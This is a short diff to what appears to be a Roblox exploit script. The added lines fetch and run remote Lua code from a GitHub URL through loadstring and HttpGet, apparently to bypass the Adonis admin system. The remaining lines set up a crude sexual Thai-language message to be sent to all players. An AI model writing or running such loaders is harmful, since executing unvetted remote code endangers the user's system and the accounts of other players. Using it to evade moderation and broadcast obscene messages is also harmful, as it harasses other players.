@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua",true))()
+wait(5)
 local args = {
     [1] = "ผมเป็นเGY และผมอยากโdนอัdถั่วดำ😘😘🥵🥵",
     [2] = "All"
